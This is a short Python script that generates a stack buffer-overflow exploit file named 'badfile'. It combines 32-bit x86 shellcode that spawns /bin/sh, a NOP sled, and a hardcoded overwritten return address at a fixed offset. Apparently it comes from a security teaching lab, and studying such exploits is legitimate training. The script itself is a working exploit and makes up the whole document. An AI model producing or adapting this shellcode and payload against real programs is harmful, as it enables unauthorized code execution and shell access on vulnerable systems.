#!/usr/bin/python3

import sys 
shellcode = (
        "\x31\xc0"
        "\x50"
        "\x68""//sh"
        "\x68""/bin"
        "\x89\xe3"
        "\x50"
        "\x53"
        "\x89\xe1"
        "\x99"
        "\xb0\x0b"
        "\xcd\x80"
    ).encode('latin-1')

# fill with NOPs 
content = bytearray(0x90 for i in range(517))

start = 517 - len(shellcode)
content[start:] = shellcode
ret = 0xffffd2a8 + 120     
offset = 112 
L = 4                       # 32-bit 

# modify the return address
content[offset:offset+L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
